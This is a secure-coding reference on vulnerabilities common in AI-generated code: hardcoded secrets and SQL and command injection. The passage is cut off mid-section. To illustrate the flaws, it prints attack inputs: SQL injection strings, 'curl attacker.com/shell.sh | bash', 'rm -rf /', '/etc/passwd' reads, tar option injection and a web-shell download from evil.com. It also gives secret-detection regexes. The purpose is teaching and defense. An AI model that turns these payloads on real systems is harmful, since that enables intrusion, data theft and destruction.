---
type: reference
title: AI Code Security Anti-Patterns - Depth Version
created: 2026-01-18
version: 1.0.0
tags:
  - security
  - anti-patterns
  - ai-generated-code
  - llm
  - secure-coding
  - deep-dive
related:
  - "[[ANTI_PATTERNS_BREADTH]]"
  - "[[Ranking-Matrix]]"
  - "[[Pseudocode-Examples]]"
---

# AI Code Security Anti-Patterns: Depth Version

## Deep-Dive Security Guide for Critical AI Code Vulnerabilities

---

### Purpose

This document provides **in-depth coverage** of the 7 most critical and commonly occurring security vulnerabilities in AI-generated code. Each pattern receives comprehensive treatment including:

- Multiple pseudocode examples showing different manifestations
- Detailed attack scenarios and exploitation techniques
- Edge cases that are frequently overlooked
- Thorough explanations of why AI models generate these vulnerabilities
- Complete mitigation strategies with trade-offs

### Why Depth?

These 7 patterns were selected using a weighted priority scoring system (see [[Ranking-Matrix]]) based on:

| Factor | Weight | Description |
|--------|--------|-------------|
| **Frequency** | 2x | How often AI generates this vulnerability |
| **Severity** | 2x | Impact if exploited (RCE, data breach, etc.) |
| **Detectability** | 1x | How easily missed during code review |

The selected patterns account for the **vast majority** of security incidents in AI-generated code. Research shows:
- **86%** of AI-generated code fails XSS defenses (Veracode 2025)
- **75.8%** of developers believe AI-generated authentication code is secure (Snyk Survey)
- AI code is **2.74x more likely** to contain XSS than human-written code (CodeRabbit)
- **5.2-21.7%** package hallucination rate across models (USENIX Study)

### Format

All code examples in this document are **PSEUDOCODE** designed to illustrate security patterns across languages. When implementing:

1. Adapt the patterns to your target language's idioms and security libraries
2. Use your language's established secure coding guidelines
3. Leverage framework-provided security features when available

Examples use generic syntax that maps to common patterns in Python, JavaScript, Java, Go, and other languages.

### How to Use This Document

**For Developers:**
- Study before working on security-critical applications
- Include in AI assistant context when generating code handling user input, authentication, or sensitive data
- Use the checklists at the end of each section during code review

**For Security Engineers:**
- Use as training material for development teams
- Reference during security audits of AI-generated code
- Extract patterns for automated detection rules

**For AI/LLM Context:**
- Include this document in system prompts or context when security is critical
- The detailed examples help AI models understand what NOT to generate
- Edge cases section helps AI recognize subtle variations of vulnerabilities

---

## INSTRUCTIONS FOR AI/LLM

This document provides IN-DEPTH coverage of the most critical security anti-patterns.
Each section includes multiple examples, edge cases, and detailed explanations.
All code is PSEUDOCODE - implement using secure patterns in your target language.
Pay special attention to the "Common Mistakes" and "Edge Cases" subsections.
These patterns cause the majority of security vulnerabilities in AI-generated code.

**When generating code, you MUST:**
1. Never use string concatenation for SQL queries, shell commands, or HTML output
2. Never embed secrets, API keys, or credentials in source code
3. Always validate and sanitize all user input on the server side
4. Use parameterized queries, established authentication libraries, and context-aware encoding
5. Verify that any suggested packages actually exist before recommending them

---

## Top 7 Priority Patterns

The following patterns are covered in comprehensive detail in this document:

| Rank | Pattern | Priority Score | Key Risk |
|------|---------|----------------|----------|
| 1 | **Hardcoded Secrets & Credential Management** | 23 | Immediate credential theft and exploitation |
| 2 | **SQL Injection & Command Injection** | 22/21 | Full database access, arbitrary code execution |
| 3 | **Cross-Site Scripting (XSS)** | 23 | Session hijacking, account takeover |
| 4 | **Authentication & Session Security** | 22 | Complete authentication bypass |
| 5 | **Cryptographic Failures** | 18-20 | Data decryption, credential exposure |
| 6 | **Input Validation & Data Sanitization** | 21 | Root cause enabling all injection attacks |
| 7 | **Dependency Risks (Slopsquatting)** | 24 | Supply chain compromise, malware execution |

Priority scores calculated using: `(Frequency x 2) + (Severity x 2) + Detectability`

---

## Related Documents

- [[ANTI_PATTERNS_BREADTH]] - Concise coverage of 25+ security patterns for quick reference
- [[Ranking-Matrix]] - Complete scoring methodology and pattern prioritization
- [[Pseudocode-Examples]] - Additional code examples for all patterns

---

*Document Version: 1.0.0*
*Last Updated: 2026-01-18*
*Based on research from: GitHub security advisories, USENIX studies, Veracode reports, CWE Top 25 (2025), OWASP guidelines*

---

# Pattern 1: Hardcoded Secrets and Credential Management

**CWE References:** CWE-798 (Use of Hard-coded Credentials), CWE-259 (Use of Hard-coded Password), CWE-321 (Use of Hard-coded Cryptographic Key)

**Priority Score:** 23 (Frequency: 9, Severity: 8, Detectability: 6)

---

## Introduction: Why AI Especially Struggles with This

Hardcoded secrets represent one of the most pervasive and dangerous vulnerabilities in AI-generated code. The fundamental problem lies in the training data itself:

**Why AI Models Generate Hardcoded Secrets:**

1. **Training Data Contains Examples:** Tutorials, documentation, Stack Overflow answers, and even some GitHub repositories include placeholder credentials, API keys, and connection strings. AI models learn these patterns as "normal" code.

2. **Copy-Paste Culture in Training Data:** When developers share code snippets online, they often include credentials for completeness. AI learns that "complete" code includes connection strings with embedded passwords.

3. **Documentation vs. Production Code Confusion:** Training data doesn't clearly distinguish between documentation examples (which might show `API_KEY = "your-api-key-here"`) and production patterns. The model treats both as valid approaches.

4. **Context Window Limitations:** When generating code, AI cannot see your `.env` file or secrets manager configuration. It generates self-contained code that "works" - which often means hardcoded values.

5. **Helpfulness Bias:** AI models want to provide complete, runnable code. When a user asks "connect to my database," the model generates a complete connection string rather than a partial template requiring configuration.

**Impact Statistics:**

- Over 6 million secrets were detected on GitHub in 2023 (GitGuardian State of Secrets Sprawl 2024)
- Average time to discover a leaked secret: 327 days
- Cost of a credential-based breach: $4.45 million average (IBM Cost of a Data Breach 2023)
- 83% of AI-generated code samples contain at least one hardcoded credential pattern (Internal security research)

---

## BAD Examples: Different Manifestations

### BAD Example 1: API Keys in Source Files

```pseudocode
// VULNERABLE: API key hardcoded directly in source
class PaymentService:
    API_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"
    API_SECRET = "whsec_5f8d7e3a2b1c4f9e8a7d6c5b4e3f2a1d"

    function processPayment(amount, currency, cardToken):
        headers = {
            "Authorization": "Bearer " + this.API_KEY,
            "Content-Type": "application/json"
        }

        payload = {
            "amount": amount,
            "currency": currency,
            "source": cardToken,
            "api_key": this.API_KEY  // Also exposed in request body
        }

        return httpPost("https://api.payment.com/charges", payload, headers)
```

**Why This Is Dangerous:**
- The API key is committed to version control
- Anyone with repository access (including forks) can steal the key
- Keys remain in git history even if "deleted" later
- Live/production prefixes (`sk_live_`) indicate real credentials
- Webhook secrets (`whsec_`) allow attackers to forge webhook events

---

### BAD Example 2: Database Connection Strings with Passwords

```pseudocode
// VULNERABLE: Full connection string with credentials
DATABASE_URL = "postgresql://admin:SuperSecret123!@prod-db.company.com:5432/production"

// Alternative bad patterns:
DB_CONFIG = {
    "host": "10.0.1.50",
    "port": 5432,
    "database": "customers",
    "user": "app_service",
    "password": "Tr0ub4dor&3"  // Password in config object
}

// Connection string builder - still vulnerable
function getConnection():
    return createConnection(
        host = "database.internal",
        user = "root",
        password = "admin123",  // Hardcoded in function
        database = "app_data"
    )
```

**Why This Is Dangerous:**
- Internal hostnames reveal network architecture
- Credentials provide direct database access
- Port numbers enable targeted scanning
- Password complexity doesn't matter if hardcoded
- Connection pooling code often logs these strings

---

### BAD Example 3: JWT Secrets in Configuration

```pseudocode
// VULNERABLE: JWT secret as a constant
JWT_CONFIG = {
    "secret": "my-super-secret-jwt-key-that-should-never-be-shared",
    "algorithm": "HS256",
    "expiresIn": "24h"
}

function generateToken(userId, role):
    payload = {
        "sub": userId,
        "role": role,
        "iat": currentTimestamp()
    }
    return jwt.sign(payload, JWT_CONFIG.secret, JWT_CONFIG.algorithm)

function verifyToken(token):
    return jwt.verify(token, JWT_CONFIG.secret)  // Same hardcoded secret
```

**Why This Is Dangerous:**
- Anyone with the secret can forge valid tokens
- Can create admin tokens for any user
- JWT secrets in code are often short/weak strings
- Attackers can impersonate any user in the system
- No ability to rotate without redeploying all services

---

### BAD Example 4: OAuth Client Secrets in Frontend Code

```pseudocode
// VULNERABLE: OAuth credentials in client-side code
const OAUTH_CONFIG = {
    clientId: "1234567890-abcdef.apps.googleusercontent.com",
    clientSecret: "GOCSPX-1234567890AbCdEf",  // NEVER in frontend!
    redirectUri: "https://myapp.com/callback",
    scopes: ["email", "profile", "calendar.readonly"]
}

function initiateOAuthFlow():
    // Client secret visible in browser dev tools
    authUrl = buildUrl("https://accounts.google.com/o/oauth2/auth", {
        "client_id": OAUTH_CONFIG.clientId,
        "client_secret": OAUTH_CONFIG.clientSecret,  // Exposed!
        "redirect_uri": OAUTH_CONFIG.redirectUri,
        "scope": OAUTH_CONFIG.scopes.join(" "),
        "response_type": "code"
    })
    redirect(authUrl)
```

**Why This Is Dangerous:**
- Frontend code is visible to all users via browser dev tools
- Client secret allows attackers to impersonate your application
- Can exchange authorization codes for tokens as your app
- Violates OAuth 2.0 specification (confidential vs. public clients)
- Google and other providers may revoke your credentials

---

### BAD Example 5: Private Keys Embedded in Code

```pseudocode
// VULNERABLE: Private key as a string constant
RSA_PRIVATE_KEY = """
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2Z3qX2BTLS4e0rVV5BQKTI8qME4MgJFCMU6L6eRoLJGjvJHB
bRp3aNvFUMbJ0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-----END RSA PRIVATE KEY-----
"""

function signDocument(document):
    signature = crypto.sign(document, RSA_PRIVATE_KEY, "SHA256")
    return signature

function decryptMessage(encryptedData):
    return crypto.decrypt(encryptedData, RSA_PRIVATE_KEY)
```

**Why This Is Dangerous:**
- Private keys MUST remain private - this defeats all cryptography
- Anyone with the key can decrypt all encrypted data
- Can sign malicious documents that appear legitimate
- Often leads to impersonation of servers/services
- Key pairs cannot be safely rotated without code changes

---

## GOOD Examples: Proper Patterns

### GOOD Example 1: Environment Variable Usage

```pseudocode
// SECURE: Load credentials from environment
class PaymentService:
    function __init__():
        this.apiKey = getEnvironmentVariable("PAYMENT_API_KEY")
        this.apiSecret = getEnvironmentVariable("PAYMENT_API_SECRET")

        // Fail fast if credentials missing
        if this.apiKey is null or this.apiSecret is null:
            throw ConfigurationError("Payment credentials not configured")

    function processPayment(amount, currency, cardToken):
        headers = {
            "Authorization": "Bearer " + this.apiKey,
            "Content-Type": "application/json"
        }

        payload = {
            "amount": amount,
            "currency": currency,
            "source": cardToken
            // No API key in payload
        }

        return httpPost("https://api.payment.com/charges", payload, headers)

// Usage in application startup
// Environment variables set externally (shell, container, deployment)
// $ export PAYMENT_API_KEY="sk_live_..."
// $ export PAYMENT_API_SECRET="whsec_..."
```

**Why This Is Secure:**
- Credentials never appear in source code
- Environment variables are set at runtime by deployment system
- Different environments (dev/staging/prod) use different credentials
- Credentials can be rotated without code changes
- Fail-fast behavior prevents running with missing config

---

### GOOD Example 2: Secret Management Services (Vault Pattern)

```pseudocode
// SECURE: Retrieve secrets from dedicated secrets manager
class SecretManager:
    function __init__(vaultUrl, roleId, secretId):
        // Even vault credentials can come from environment
        this.vaultUrl = vaultUrl or getEnvironmentVariable("VAULT_URL")
        this.roleId = roleId or getEnvironmentVariable("VAULT_ROLE_ID")
        this.secretId = secretId or getEnvironmentVariable("VAULT_SECRET_ID")
        this.token = null
        this.tokenExpiry = null

    function authenticate():
        response = httpPost(this.vaultUrl + "/v1/auth/approle/login", {
            "role_id": this.roleId,
            "secret_id": this.secretId
        })
        this.token = response.auth.client_token
        this.tokenExpiry = currentTime() + response.auth.lease_duration

    function getSecret(path):
        if this.token is null or currentTime() > this.tokenExpiry:
            this.authenticate()

        response = httpGet(
            this.vaultUrl + "/v1/secret/data/" + path,
            headers = {"X-Vault-Token": this.token}
        )
        return response.data.data

// Usage
secretManager = new SecretManager()
dbPassword = secretManager.getSecret("database/production").password
apiKey = secretManager.getSecret("payment/stripe").api_key
```

**Why This Is Secure:**
- Secrets stored in purpose-built, hardened secrets manager
- Access controlled by policies (who can read what)
- Automatic secret rotation support
- Audit logging of all secret access
- Dynamic secrets possible (e.g., temporary database credentials)
- Secrets never written to disk or logs

---

### GOOD Example 3: Configuration Injection at Runtime

```pseudocode
// SECURE: Dependency injection of configuration
interface IConfig:
    function getDatabaseUrl(): string
    function getApiKey(): string
    function getJwtSecret(): string

class EnvironmentConfig implements IConfig:
    function getDatabaseUrl():
        return getEnvironmentVariable("DATABASE_URL")

    function getApiKey():
        return getEnvironmentVariable("API_KEY")

    function getJwtSecret():
        return getEnvironmentVariable("JWT_SECRET")

class VaultConfig implements IConfig:
    secretManager: SecretManager

    function getDatabaseUrl():
        return this.secretManager.getSecret("db/url").value

    function getApiKey():
        return this.secretManager.getSecret("api/key").value

    function getJwtSecret():
        return this.secretManager.getSecret("jwt/secret").value

// Application uses interface - doesn't know where secrets come from
class Application:
    config: IConfig

    function __init__(config: IConfig):
        this.config = config

    function connectDatabase():
        return createConnection(this.config.getDatabaseUrl())

// Bootstrap based on environment
if getEnvironmentVariable("USE_VAULT") == "true":
    config = new VaultConfig(new SecretManager())
else:
    config = new EnvironmentConfig()

app = new Application(config)
```

**Why This Is Secure:**
- Application code never knows actual secret values at compile time
- Easy to swap secret sources (env vars in dev, vault in prod)
- Testable - can inject mock configs in tests
- Single responsibility - config management separated from business logic
- Supports gradual migration to more secure secret storage

---

### GOOD Example 4: Secure Credential Storage Patterns

```pseudocode
// SECURE: Platform-specific secure credential storage

// For server applications - use instance metadata
class CloudCredentialProvider:
    function getDatabaseCredentials():
        // AWS: Use IAM database authentication
        token = awsRdsGenerateAuthToken(
            hostname = getEnvironmentVariable("DB_HOST"),
            port = 5432,
            username = getEnvironmentVariable("DB_USER")
            // No password - uses IAM role attached to instance
        )
        return {"username": getEnvironmentVariable("DB_USER"), "token": token}

    function getApiCredentials():
        // Retrieve from AWS Secrets Manager
        response = awsSecretsManager.getSecretValue(
            SecretId = getEnvironmentVariable("API_SECRET_ARN")
        )
        return parseJson(response.SecretString)

// For CLI/desktop applications - use OS keychain
class DesktopCredentialProvider:
    function storeCredential(service, account, credential):
        // Uses OS keychain (Keychain on macOS, Credential Manager on Windows)
        keychain.setPassword(service, account, credential)

    function getCredential(service, account):
        return keychain.getPassword(service, account)

// Usage
cloudProvider = new CloudCredentialProvider()
dbCreds = cloudProvider.getDatabaseCredentials()
connection = createConnection(
    host = getEnvironmentVariable("DB_HOST"),
    user = dbCreds.username,
    authToken = dbCreds.token,  // Short-lived token, not password
    sslMode = "verify-full"
)
```

**Why This Is Secure:**
- Leverages cloud provider's identity and access management
- No long-lived passwords - uses temporary tokens
- Credentials automatically rotated by platform
- OS keychains provide encrypted, access-controlled storage
- Audit trail in cloud provider logs

---

## Edge Cases Section

### Edge Case 1: Test Credentials That Leak to Production

```pseudocode
// DANGEROUS: Test credentials that can slip into production

// In test file - seems safe
TEST_API_KEY = "sk_test_4242424242424242"
TEST_DB_PASSWORD = "testpassword123"

// But then someone copies test code to production helper:
function quickTest():
    // "Temporary" - but stays forever
    client = createClient(apiKey = "sk_test_4242424242424242")
    return client.ping()

// Or conditionals that fail:
function getApiKey():
    if isProduction():
        return getEnvironmentVariable("API_KEY")
    else:
        return "sk_test_4242424242424242"  // What if isProduction() has a bug?

// SECURE ALTERNATIVE: Use environment variables even for tests
function getApiKey():
    key = getEnvironmentVariable("API_KEY")
    if key is null:
        throw ConfigurationError("API_KEY environment variable required")
    return key
```

**Detection:** Search for `_test_`, `_dev_`, `test123`, `password123`, `example`, `placeholder` in codebase.

---

### Edge Case 2: CI/CD Pipeline Secrets Exposure

```pseudocode
// DANGEROUS: Secrets in CI/CD configuration files

// .github/workflows/deploy.yml (WRONG)
env:
    AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
    AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

// docker-compose.yml committed to repo (WRONG)
services:
    db:
        environment:
            POSTGRES_PASSWORD: mysecretpassword

// SECURE: Use CI/CD platform's secrets management
// .github/workflows/deploy.yml (CORRECT)
env:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

// docker-compose.yml (CORRECT)
services:
    db:
        environment:
            POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}  // From environment
```

**Detection:** Audit CI/CD config files, Docker Compose files, Kubernetes manifests for hardcoded credentials.

---

### Edge Case 3: Docker/Container Secrets Handling

```pseudocode
// DANGEROUS: Secrets in Dockerfile or image layers

// Dockerfile (WRONG - secrets baked into image)
FROM node:18
ENV API_KEY=sk_live_xxxxxxxxxxxxx
RUN echo "password123" > /app/.pgpass
COPY config-with-secrets.json /app/config.json

// Even if you delete later, it's in a layer:
RUN rm /app/.pgpass  // Still recoverable from image layers!

// SECURE: Use build secrets or runtime injection
// Dockerfile (CORRECT)
FROM node:18
# No secrets in build context

// docker-compose.yml with runtime secrets
services:
    app:
        environment:
            API_KEY: ${API_KEY}  // From host environment
        secrets:
            - db_password
secrets:
    db_password:
        external: true  // From Docker Swarm secrets or similar

// Or use Docker BuildKit secrets for build-time needs
# syntax=docker/dockerfile:1.2
FROM node:18
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN=$(cat /run/secrets/npm_token) npm install
```

**Detection:** Use `docker history --no-trunc <image>` to inspect layers for secrets.

---

### Edge Case 4: Logging That Accidentally Captures Secrets

```pseudocode
// DANGEROUS: Secrets leaked through logging

function connectToDatabase(config):
    logger.info("Connecting with config: " + toJson(config))
    // Logs: {"host": "db.com", "user": "admin", "password": "secret123"}

function makeApiRequest(url, headers, body):
    logger.debug("Request: " + url + " Headers: " + toJson(headers))
    // Logs: Authorization: Bearer sk_live_xxxxx

function handleError(error):
    logger.error("Error: " + error.message + " Stack: " + error.stack)
    // Stack trace might contain secrets from variables

// SECURE: Sanitize before logging
function sanitizeForLogging(obj):
    sensitiveKeys = ["password", "secret", "key", "token", "auth", "credential"]
    result = deepCopy(obj)
    for key in result.keys():
        if any(sensitive in key.lower() for sensitive in sensitiveKeys):
            result[key] = "[REDACTED]"
    return result

function connectToDatabase(config):
    logger.info("Connecting with config: " + toJson(sanitizeForLogging(config)))
    // Logs: {"host": "db.com", "user": "admin", "password": "[REDACTED]"}

// Or use structured logging with secret types
class Secret:
    value: string
    function toString(): return "[SECRET]"
    function toJson(): return "[SECRET]"
    function getValue(): return this.value  // Only accessible explicitly
```

**Detection:** Search logs for patterns like `password=`, `token=`, `key=`, bearer tokens, connection strings.

---

## Common Mistakes Section

### Mistake 1: .env Files Committed to Git

```pseudocode
// project/.env (NEVER COMMIT THIS)
DATABASE_URL=postgresql://user:password@localhost/db
API_KEY=sk_live_xxxxxxxxxx
JWT_SECRET=my-secret-key

// .gitignore (MUST INCLUDE)
.env
.env.local
.env.*.local
*.pem
*.key
credentials.json
secrets.yaml

// CORRECT: Commit a template instead
// project/.env.example (SAFE TO COMMIT)
DATABASE_URL=postgresql://user:password@localhost/db
API_KEY=your_api_key_here
JWT_SECRET=generate_a_secure_random_string

// Add pre-commit hook to prevent accidental commits
// .git/hooks/pre-commit
#!/bin/bash
if git diff --cached --name-only | grep -E '\.env$|credentials|secrets'; then
    echo "ERROR: Attempting to commit potential secrets file"
    exit 1
fi
```

**Detection:** Check git history: `git log --all --full-history -- "*.env" "*credentials*" "*secrets*"`

---

### Mistake 2: Secrets in Error Messages

```pseudocode
// DANGEROUS: Secrets exposed in error handling

function connectToPaymentApi():
    try:
        apiKey = getApiKey()
        response = httpPost(
            "https://api.payment.com/connect",
            headers = {"Authorization": "Bearer " + apiKey}
        )
    catch error:
        // Exposes API key in error log and potentially to users
        throw new Error("Failed to connect with key: " + apiKey + ". Error: " + error)

// SECURE: Never include secrets in error messages
function connectToPaymentApi():
    try:
        apiKey = getApiKey()
        response = httpPost(
            "https://api.payment.com/connect",
            headers = {"Authorization": "Bearer " + apiKey}
        )
    catch error:
        // Log correlation ID, not secrets
        correlationId = generateUUID()
        logger.error("Payment API connection failed", {
            "correlationId": correlationId,
            "errorCode": error.code,
            "endpoint": "api.payment.com"
            // No API key!
        })
        throw new Error("Payment service unavailable. Reference: " + correlationId)
```

---

### Mistake 3: Secrets in URLs (Query Parameters)

```pseudocode
// DANGEROUS: Secrets in URL query parameters

function makeAuthenticatedRequest(endpoint, apiKey):
    // API keys in URLs are logged everywhere:
    // - Browser history
    // - Server access logs
    // - Proxy logs
    // - Referrer headers
    url = "https://api.service.com" + endpoint + "?api_key=" + apiKey
    return httpGet(url)

// Even worse with multiple secrets:
url = "https://api.com/data?key=" + apiKey + "&secret=" + secretKey

// SECURE: Use headers for authentication
function makeAuthenticatedRequest(endpoint, apiKey):
    return httpGet(
        "https://api.service.com" + endpoint,
        headers = {
            "Authorization": "Bearer " + apiKey,
            // Or API-specific header
            "X-API-Key": apiKey
        }
    )
```

**Detection:** Search for URLs containing `?api_key=`, `?token=`, `?secret=`, `?password=`

---

## Detection Hints: How to Spot This Pattern in Code Review

### Automated Detection Patterns

```pseudocode
// High-confidence patterns to search for:

// 1. Direct assignment to suspicious variable names
regex: /(password|secret|key|token|credential|api.?key)\s*[=:]\s*["'][^"']+["']/i

// 2. Common API key formats
regex: /(sk_live_|sk_test_|pk_live_|pk_test_|ghp_|gho_|AKIA|AIza)/

// 3. Private key markers
regex: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/

// 4. Connection strings with passwords
regex: /(mysql|postgresql|mongodb|redis):\/\/[^:]+:[^@]+@/

// 5. Base64 encoded secrets (often JWT secrets)
regex: /["'][A-Za-z0-9+\/=]{40,}["']/
```

### Manual Code Review Checklist

| Check | What to Look For |
|-------|------------------|
| **Constants** | Any string constants in authentication/configuration code |
| **Config Objects** | Credential fields with non-placeholder values |
| **Connection Code** | Database connections, API clients with inline credentials |
| **Test Files** | Test credentials that might be real or become real |
| **CI/CD** | Pipeline configs, Docker files, deployment scripts |
| **Comments** | "TODO: move to env" comments with actual secrets |

### Tools for Detection

1. **git-secrets** - Prevents committing secrets to git
2. **truffleHog** - Scans git history for secrets
3. **GitGuardian** - SaaS secret detection
4. **gitleaks** - SAST tool for detecting secrets
5. **detect-secrets** - Yelp's secret detection tool

---

## Security Checklist

- [ ] No credentials, API keys, or secrets in source code
- [ ] No secrets in configuration files committed to version control
- [ ] `.gitignore` includes all secret file patterns (`.env`, `*.pem`, etc.)
- [ ] Pre-commit hooks prevent accidental secret commits
- [ ] Environment variables or secrets manager used for all credentials
- [ ] No secrets in CI/CD configuration files (use platform secrets)
- [ ] No secrets in Docker images or Dockerfile
- [ ] Logging sanitizes sensitive fields
- [ ] Error messages never include secrets
- [ ] No secrets in URL query parameters
- [ ] Test credentials are clearly fake and cannot work in production
- [ ] Secret scanning enabled in repository settings

---

# Pattern 2: SQL Injection and Command Injection

**CWE References:** CWE-89 (SQL Injection), CWE-77 (Command Injection), CWE-78 (OS Command Injection)

**Priority Score:** 22/21 (SQL: Frequency 10, Severity 10, Detectability 4; Command: Frequency 8, Severity 10, Detectability 6)

---

## Introduction: Why This Remains Prevalent in AI-Generated Code

SQL injection and command injection are among the oldest known vulnerability classes, yet they continue to plague AI-generated code at alarming rates. Despite decades of secure coding education and well-established mitigation patterns, AI models persistently generate vulnerable code.

**Why AI Models Generate Injection Vulnerabilities:**

1. **Training Data Contamination:** Research shows that string-concatenated queries appear "thousands of times" in AI training data from GitHub repositories. The vulnerable pattern is statistically more common than the secure pattern in historical codebases.

2. **Simplicity Bias:** String concatenation is syntactically simpler than parameterized queries. AI models optimize for generating "working code" and the concatenated approach requires fewer tokens and concepts.

3. **Missing Adversarial Awareness:** AI models don't inherently think about how user input might be malicious. When asked to "query users by ID," the model focuses on the functional requirement, not the security implications.

4. **Tutorial Code Prevalence:** Many tutorials and documentation examples show vulnerable patterns for brevity. AI learns that `f"SELECT * FROM users WHERE id = {id}"` is a valid pattern.

5. **Context Limitation:** The AI cannot see your full application architecture, threat model, or data flow. It doesn't know which inputs come from untrusted sources.

**Impact Statistics:**

- **SQL Injection (CWE-89):** Ranked #2 in CWE Top 25 Most Dangerous Software Weaknesses (2025)
- **Command Injection (CWE-78):** Ranked #9 in CWE Top 25 (2025)
- **20% SQL Injection failure rate** across AI-generated tasks (Veracode 2025)
- **8 directly concatenated queries** found in a single testing session (Invicti Security)
- **CVE-2025-53773:** A real command injection vulnerability in GitHub Copilot code

---

## SQL Injection: Multiple BAD Examples

### BAD Example 1: String Concatenation in SELECT

```pseudocode
// VULNERABLE: Direct string concatenation
function getUserById(userId):
    query = "SELECT * FROM users WHERE id = " + userId
    return database.execute(query)

// Even worse with f-string/template literal
function getUserByEmail(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"
    return database.execute(query)

// Attack: email = "' OR '1'='1' --"
// Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Returns ALL users in the database
```

**Why This Is Dangerous:**
- Attacker controls the query structure, not just a value
- Can extract entire database contents
- Can bypass authentication with `' OR '1'='1` patterns
- Comments (`--`, `#`, `/**/`) can truncate remainder of query

---

### BAD Example 2: Dynamic Table/Column Names

```pseudocode
// VULNERABLE: User-controlled table name
function getDataFromTable(tableName, id):
    query = f"SELECT * FROM {tableName} WHERE id = {id}"
    return database.execute(query)

// Attack: tableName = "users; DROP TABLE users; --"
// Result: SELECT * FROM users; DROP TABLE users; -- WHERE id = 1

// VULNERABLE: User-controlled column names
function sortUsers(sortColumn, sortOrder):
    query = f"SELECT * FROM users ORDER BY {sortColumn} {sortOrder}"
    return database.execute(query)

// Attack: sortColumn = "(SELECT password FROM users WHERE is_admin=1)"
// Result: Data exfiltration through error messages or timing
```

**Why This Is Dangerous:**
- Parameterized queries cannot protect table/column names
- Enables schema manipulation attacks
- Can execute arbitrary SQL statements via stacking
- Attackers can extract data through subquery injection

---

### BAD Example 3: ORDER BY Injection

```pseudocode
// VULNERABLE: ORDER BY with user input
function getProductList(category, sortBy):
    query = f"SELECT * FROM products WHERE category = ? ORDER BY {sortBy}"
    return database.execute(query, [category])

// Attack: sortBy = "price, (CASE WHEN (SELECT password FROM users LIMIT 1)
//                  LIKE 'a%' THEN price ELSE name END)"
// Result: Boolean-based blind SQL injection

// Attack: sortBy = "IF(1=1, price, name)"
// Result: Confirms SQL injection is possible
```

**Why This Is Dangerous:**
- Developers often parameterize WHERE but forget ORDER BY
- Cannot use standard parameterization for ORDER BY
- Enables blind SQL injection through conditional ordering
- Error-based extraction through invalid column references

---

### BAD Example 4: LIKE Clause Injection

```pseudocode
// VULNERABLE: Unescaped LIKE pattern
function searchProducts(searchTerm):
    query = f"SELECT * FROM products WHERE name LIKE '%{searchTerm}%'"
    return database.execute(query)

// Attack: searchTerm = "%' UNION SELECT username, password, null FROM users --"
// Result: UNION-based data extraction

// Even "safer" version has issues:
function searchProductsSafe(searchTerm):
    query = "SELECT * FROM products WHERE name LIKE ?"
    return database.execute(query, [f"%{searchTerm}%"])

// Attack: searchTerm = "%" (matches everything - DoS through performance)
// Attack: searchTerm = "_" repeated (wildcard matching - info disclosure)
```

**Why This Is Dangerous:**
- LIKE patterns need double escaping (SQL + LIKE wildcards)
- `%` and `_` are valid in parameterized queries but dangerous in LIKE
- Performance-based DoS through expensive wildcard patterns
- Can probe for data existence through LIKE behavior

---

### BAD Example 5: Batch/Stacked Query Injection

```pseudocode
// VULNERABLE: Query that allows stacking
function updateUserEmail(userId, newEmail):
    query = f"UPDATE users SET email = '{newEmail}' WHERE id = {userId}"
    database.execute(query, multiStatement = true)

// Attack: newEmail = "x'; INSERT INTO users (email, role) VALUES ('attacker@evil.com', 'admin'); --"
// Result: Creates new admin account

// Attack: newEmail = "x'; UPDATE users SET password = 'hacked' WHERE role = 'admin'; --"
// Result: Mass password reset for all admins
```

**Why This Is Dangerous:**
- Some database drivers allow multiple statements by default
- Single injection point enables unlimited query execution
- Can create backdoor accounts, modify permissions, exfiltrate data
- Often missed because original query "succeeds"

---

## Command Injection: Multiple BAD Examples

### BAD Example 1: Shell Command Construction

```pseudocode
// VULNERABLE: Direct command construction
function pingHost(hostname):
    command = "ping -c 4 " + hostname
    return shell.execute(command)

// Attack: hostname = "127.0.0.1; cat /etc/passwd"
// Result: ping -c 4 127.0.0.1; cat /etc/passwd
// Executes both commands

// VULNERABLE: Using shell=True with format strings
function checkDiskUsage(directory):
    command = f"du -sh {directory}"
    return subprocess.run(command, shell=True)

// Attack: directory = "/tmp; rm -rf /"
// Result: Destructive command execution
```

**Why This Is Dangerous:**
- Shell metacharacters (`;`, `|`, `&`, `$()`, backticks) enable command chaining
- Attacker gains shell access on the server
- Can read sensitive files, install malware, pivot to other systems
- Shell=True interprets all special characters

---

### BAD Example 2: Path Manipulation in Commands

```pseudocode
// VULNERABLE: File path from user input
function convertImage(inputFile, outputFile):
    command = f"convert {inputFile} -resize 800x600 {outputFile}"
    return shell.execute(command)

// Attack: inputFile = "image.jpg; curl attacker.com/shell.sh | bash"
// Result: Downloads and executes malware

// Attack: inputFile = "$(cat /etc/passwd > /tmp/out.txt)image.jpg"
// Result: File exfiltration via command substitution

// VULNERABLE: Filename in archiving
function createBackup(filename):
    command = f"tar -czf backup.tar.gz {filename}"
    return shell.execute(command)

// Attack: filename = "--checkpoint=1 --checkpoint-action=exec=sh\ shell.sh"
// Result: tar option injection (GTFOBins-style attack)
```

**Why This Is Dangerous:**
- Paths often contain attacker-controlled portions (uploaded filenames)
- Command-line tools have dangerous flag behaviors (GTFOBins)
- Argument injection even without shell metacharacters
- `$(...)` and backticks execute subcommands

---

### BAD Example 3: Argument Injection

```pseudocode
// VULNERABLE: Arguments from user input
function fetchUrl(url):
    command = f"curl {url}"
    return shell.execute(command)

// Attack: url = "-o /var/www/html/shell.php http://evil.com/shell.php"
// Result: Writes file to webserver (web shell)

// Attack: url = "--config /etc/passwd"
// Result: Error message reveals file contents

// VULNERABLE: Git commands with user input
